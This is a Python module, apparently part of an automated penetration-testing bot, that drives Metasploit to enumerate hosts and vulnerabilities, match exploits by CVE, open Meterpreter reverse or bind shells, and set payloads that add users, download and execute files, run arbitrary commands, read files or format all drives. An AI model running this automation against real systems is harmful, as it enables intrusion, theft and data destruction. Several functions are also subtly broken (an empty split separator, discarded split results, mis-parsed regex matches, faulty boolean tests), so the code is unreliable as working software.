from time import sleep
import socket
import sys
from time import sleep
import re
sys.path.append('./')
import clients.metasploit


def strip_whitespaces(str):
    return ' '.join(str.split(''))


def host_table(client):
    hosts = []
    response = str(client.console_execute('hosts -c address,mac,os_name,os_flavor')) # TODO add more ?
    while not 'Hosts' in response:
        sleep(10)
        response = client.console_read()
    response.split('\n')
    for row in response:
        row = strip_whitespaces(row)
        row = row.split(' ')
        hosts.append({'ip': row[0], 'mac': row[1], 'os_name': row[2], 'os_flavor': row[3]}) # ip address, mac address
    return hosts


class Target(object):
    def __init__(self, client, ip, mac):
        self.client = client
        self.ip = ip
        self.mac = mac
        self.services = []
        self.vulns = []
        self.exploits = []
        self.report = ''

    def add_services(self):
        """
        Add all services a host has
        """
        # first get the names
        names = str(self.client.console_execute('services -c name {0}\n'.format(self.ip))[b'data'])
        while not 'name' in names:
            sleep(10)
            names = self.client.console_read()
        names = names.split('\n')
        for row in names:
            if self.ip in row:
                row = strip_whitespaces(row)
                self.services.append({'name': row.split(' ')[1]})

        # get the ports by service name
        ports = str(self.client.console_execute('services -c port {0}\n'.format(self.ip))[b'data'])
        while not 'port' in ports:
            sleep(10)
            ports = self.client.console_read()
        ports = ports.split('\n')
        for row in ports:
            for service in self.services:
                if service['name'] in row:
                    row = strip_whitespaces(row)
                    service['port'] = row.split(' ')[1]

        # get some information by service name (only useful if a report shall be generated)
        info = str(self.client.console_execute('services -c info {0}\n'.format(self.ip))[b'data'])
        while not 'info' in info:
            sleep(10)
            info = self.client.console_read()
        info = info.split('\n')
        for row in info:
            for service in self.services:
                if service['name'] in row:
                    row = strip_whitespaces(row)
                    service['info'] = row.split(' ')[1]

    def add_vulns(self):
        """
        Add all vulnerabilites that were found.
        """
        vulns = str(self.client.console_execute('vulns \n')[b'data'])
        while not 'Time' in vulns:
            sleep(10)
            vulns = self.client.console_read()
        vulns = vulns.split('\n')
        for vuln in vulns:
            if self.ip in vuln:
                name = re.findall(r'name=[a-zA-Z0-9-]*', vuln)
                name = name.split('=')[1]

                refs = re.findall(r'refs=[a-zA-Z0-9-,]*', vuln)
                refs = refs.split('=')[1]
                refs = refs.split(',')

                self.vulns.append({'name': name, 'refs': refs})

    def resolve_vulns(self):
        """
        Search exploits for the vulnerabilites found.
        """
        for vuln in self.vulns:
            for ref in vuln.refs:
                if 'cve' in str.lower(ref):
                    results = str(self.client.console_execute('search cve:{0}\n'.format(ref))[b'data'])
                    while not 'Modules' in results:
                        sleep(10)
                        results = self.client.console_read()
                    results = results.split('\n')
                    for line in results:
                        if 'exploit' in line:
                            self.exploits.append(line.split(' ')[0])

    def gen_report(self):
        """
        Generate a human readable report of all information that we have. (markdown)
        """
        self.report = '#Report for {0}\n'.format(self.ip)
        self.report += 'This report was generated by the chameleon pentest bot. We cannot grant 100% accurate results.\n'
        self.report += '###Services:\n'
        for service in self.services:
            self.report += '#####{0}:\n- Port: {1}\n- Info:{2}'.format(service.name, service.port, service.info)
        self.report += '###Vulnerabilities:\n'
        for vuln in self.vulns:
            self.report += '- {0}\n'.format(vuln.name)
        self.report += 'Open an issue for wrong results at github.com/coretool/chameleon.'


def select_exploit(client, exploit):
    client.console_execute('use {0}\n'.format(exploit))


def select_target(client, ip):
    client.console_execute('host -S {0} -R\n'.format(ip))


def get_payloads(client):
    result = str(client.console_execute('show payloads\n')[b'data'])
    if 'compatible payloads' not in str.lower(result):
        result = client.console_read()
        while 'compatible payloads' not in result:
            sleep(10)
            result = client.console_read()
    result = result.split('\n')
    payloads = {}
    for payload in result:
        if 'meterpreter' and 'reverse' in payload:
            payload = ' '.join(payload.split())
            payload = payload.split(' ')[0]
            payloads['mr'] = payload  # meterpreter reverse shell
        if 'meterpreter' and 'bind' in payload:
            payload = ' '.join(payload.split())
            payload = payload.split(' ')[0]
            payloads['mb'] = payload  # meterpreter bind shell
        """
        elif 'shell' and 'reverse' in payload:
            payload = ' '.join(payload.split())
            payload = payload.split(' ')[0]
            pyloads.append({'name': 'sr', 'payload': payload}) # reverse shell
        elif 'shell' and 'bind' in payload:
            payload = ' '.join(payload.split())
            payload = payload.split(' ')[0]
            payload.append({'name', 'sb', 'payload': payload}) # bind shell
        """
        if 'adduser' in payload:
            payload = ' '.join(payload.split())
            payload = payload.split(' ')[0]
            payloads['au'] = payload  # add user

        if 'chmod' in payload:
            payload = ' '.join(payload.split())
            payload = payload.split(' ')[0]
            payloads['cm'] = payload  # chmod

        if 'download_exec' in payload:
            payload = ' '.join(payload.split())
            payload = payload.split(' ')[0]
            payloads['de'] = payload  # download and execute payload

        if 'exec' in payload:
            payload = ' '.join(payload.split())
            payload = payload.split(' ')[0]
            payloads['ec'] = payload  # exec

        if 'format_all_drives' in payload:
            payload = ' '.join(payload.split())
            payload = payload.split(' ')[0]
            payloads['fad'] = payload  # fromat all drives

        if 'messagebox' in payload:
            payload = ' '.join(payload.split())
            payload = payload.split(' ')[0]
            payloads['mb'] = payload  # messagebox

        if 'readfile' in payload:
            payload = ' '.join(payload.split())
            payload = payload.split(' ')[0]
            payloads['rf'] = payload  # read file

        if 'speak' in payload:
            payload = ' '.join(payload.split())
            payload = payload.split(' ')[0]
            payloads['sp'] = payload  # speak

        if 'say' in payload:
            payload = ' '.join(payload.split())
            payload = payload.split(' ')[0]
            payloads['sy'] = payload  # say

    return payloads


def setup_reverse(client, payload):
    lhost = socket.gethostbyname(socket.gethostname())
    lport = 3715
    client.console_execute('set PAYLOAD {0}\n'.format(payload))
    client.console_execute('set LHOST {0}\n'.format(lhost))
    client.console_execute('set LPORT {0}\n'.format(lport))


def setup_bind(client, payload):
    client.console_execute('set PAYLOAD {0}\n'.format(payload))


def run_meterpreter(client):
    response = str(client.console_execute('run\n')[b'data'])
    while 'session' not in response:
        sleep(10)
        response = client.console_read()

    if not 'opened' in response:
        return False

    response = response.split('\n')
    for row in response:
        if 'Meterpreter session' in row:
            row = row.split(' ')
            return row[2] # session id


def back(client):
    client.console_execute('back\n')


# single payloads

def adduser(client, user, password, payloads):
    client.console_execute('set PAYLOAD {0}\n'.format(payloads['au']))
    client.console_execute('set USER {0}\n'.format(user))
    client.console_execute('set PASS {0}\n'.format(password))

def chmod(client, file, payloads):
    client.console_execute('set PAYLOAD {0}\n'.format(payloads['cm']))
    client.console_execute('set FILE {0}\n'.format(file))

def dl_exec(client, url, name, payloads):
    client.console_execute('set PAYLOAD {0}\n'.format(payloads['de']))
    client.console_execute('set URL {0}\n'.format(url))
    client.console_execute('set EXE {0}\n'.format(name))


def exec(client, command, payloads):
    client.console_execute('set PAYLOAD {0}\n'.format(payloads['ec']))
    client.console_execute('set CMD {0}\n'.format(command))


def format_all_drives(client, label, payloads):
    client.console_execute('set PAYLOAD {0}\n'.format(payloads['fad']))
    client.console_execute('set VOLUMELABEL {0}\n'.format(label))


def messagebox(client, payloads, title, text, icon='ERROR'):
    client.console_execute('set PAYLOAD {0}\n'.format(payloads['mb']))
    client.console_execute('set TITLE {0}\n'.format(title))
    client.console_execute('set TEXT {0}\n'.format(text))
    client.console_execute('set ICON {0}\n'.format(icon))


def readfile(client, file, out, payloads):
    client.console_execute('set PAYLOAD {0}\n'.format(payloads['rf']))
    client.console_execute('set PATH {0}\n'.format(file))
    client.console_execute('set FD {0}\n'.format(out))


def speak(client, payloads):
    client.console_execute('set PAYLOAD {0}\n'.format(payloads['sp']))


def say(client, text, payloads):
    client.console_execute('set PAYLOAD {0}\n'.format(payloads['sy']))
    client.console_execute('set TEXT {0}\n'.format(text))


def run_single(client):
    client.console_execute('exploits')

# session management

class Session(object):
    def __init__(self, sid, client):
        self.id = sid
        self.client = client

    def read(self):
        return str(self.client.call('session.meterpreter_read', self.id)[b'data'])

    def write(self, text):
        self.client.call('session.meterpreter_write', self.id, text)

    def stop(self):
        self.client.call('session.stop', self.id)
